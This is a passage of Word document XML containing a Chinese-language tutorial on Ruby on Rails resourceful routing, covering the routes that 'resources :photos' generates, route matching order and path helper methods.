        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2256"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="54CA6A3B" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0EC27335" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1243225181"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>DELETE /photos/17</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="745A393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它会向 路由请求匹配到一个控制器行为上，这里假设匹配上了我们路由上的这条规则</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2256"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6F762A45" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4450EBE3" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="129976781"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :photos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="23408BD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就将会把这个请求分发到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>photos</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制器下的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法下，并且把 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>{ :id =&gt; “17” }</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为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的值.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4234E2"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2.2 CRUD, Verbs, Actions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF3CA9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对于 Rails 一个 Resourceful 的路由提供了一组 HTTP 和 控制器行为的对应关系。它还约定了与每个行为相对应的 CRUD 的数据库操作。例如这样的一个 简单的 路由记录：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2256"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="066B5BBA" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3FB10DCE" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="868101513"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :photos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5FAA916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将会在应用中生成七个不同的路由记录，他们都会匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Photos</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制器上去。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1409"/>
        <w:gridCol w:w="2136"/>
        <w:gridCol w:w="1056"/>
        <w:gridCol w:w="3921"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="24D484A1" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D9954BE"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HTTP Verb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E54D091"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Path </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46D238D2"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action </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09DAAABB"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used for </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="543376B4" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07F0CCE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3BF1D7D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 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47F3359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index </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="585BC8C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display a list of all photos </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="53F257A8" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="555DB87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077BC99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/photos/new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32F0629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new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B032D6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return an HTML form for creating a new photo </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="412A6099" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1319B68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POST </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C7D15F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 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45C171C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create </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="293714E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create a new photo </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="658C39C6" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="11C8B6A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5C1331A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/photos/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6764B47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show </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D6C79E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display a specific photo </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3E6F58EB" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F9151F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1503812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/photos/:id/edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="427E5CA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edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04B5684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return an HTML form for editing a photo </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="264DA89E" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="50B30E6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PATCH/PUT </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="003B855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/photos/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="067830B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update </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4BF237A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update a specific photo </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="03176091" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C4A89C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DELETE </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2294124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/photos/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="258DDAC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destroy </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E0DD0F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delete a specific photo </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="32E0484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路由的匹配是按照规则顺序匹配的，所以如果在你的路由规则中有一句 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>resources :photos</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，接着一句 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>get 'photos/poll'</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">， 这样的话 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>resources</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 定义的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个行为会比 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法优先完成匹配。如果这样并非是你的本意，你只要将 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>get 'photos/poll'</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 调到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>resources</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 那行的前面就可以先行指定特别的匹配规则。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6142C9EE"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2.3 URL 和 Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A49880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建立一个 Resourceful 的路由的同时也会为你的应用自动添加一系列的 Helper 方法。以上面的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>resources :photos</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由规则为例：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F442D8" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>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photos_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B52B31" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>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new_photo_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/new</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B46BEA9" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>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edit_photo_path(:id)</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/:id/edit</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (例如, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit_photo_path(10)</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/10/edit</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040D144B" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>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photo_path(:id)</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/:id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (例如, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>photo_path(10)</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/10</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D02BE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同时，这些 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Helper 方法还有一个对应的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
